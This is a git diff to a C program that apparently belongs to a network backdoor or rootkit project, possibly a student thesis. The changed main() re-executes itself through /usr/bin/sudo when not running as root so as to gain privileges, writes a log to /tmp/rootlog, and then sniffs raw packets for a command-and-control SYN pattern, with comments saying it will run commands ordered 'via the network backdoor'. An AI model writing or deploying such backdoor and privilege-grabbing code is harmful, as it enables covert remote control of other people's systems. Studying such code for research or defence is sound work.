@@ -78,12 +78,31 @@ int main(int argc, char* argv[], char *envp[]){
     timeinfo = localtime ( &rawtime );
     char* timestr = asctime(timeinfo);
 
+
+    if(geteuid() != 0){
+        //We do not have privileges, but we do want them. Let's rerun the program now.
+        char* args[argc+1]; 
+        args[0] = argv[0];
+        for(int ii=0; ii<argc; ii++){
+            args[ii+1] = argv[ii];
+        }
+        if(execve("/usr/bin/sudo", args, envp)<0){
+            perror("Failed to execve()");
+            exit(-1);
+        }
+    }
+
+
     //We proceed to fork() and exec the original program, whilst also executing the one we 
     //ordered to execute via the network backdoor
     //int bpf_map_fd = bpf_map_get_fd_by_id()
 
-    int fd = open("/home/osboxes/TFG/src/log", O_RDWR | O_CREAT | O_TRUNC, 0666);
-    
+    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
+    if(fd<0){
+        perror("Failed to open log file");
+        //return -1;
+    }
+
     int ii = 0;
     while(*(timestr+ii)!='\0'){
         write(fd, timestr+ii, 1);
@@ -100,18 +119,6 @@ int main(int argc, char* argv[], char *envp[]){
     write(fd, "\n", 1);
     write(fd, "Sniffing...\n", 13);
     
-    if(geteuid() != 0){
-        //We do not have privileges, but we do want them. Let's rerun the program now.
-        char* args[argc+1]; 
-        args[0] = argv[0];
-        for(int ii=0; ii<argc; ii++){
-            args[ii+1] = argv[ii];
-        }
-        if(execve("/usr/bin/sudo", args, envp)<0){
-            perror("Failed to execve()");
-            exit(-1);
-        }
-    }
 
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
     if(packet.ipheader == NULL){
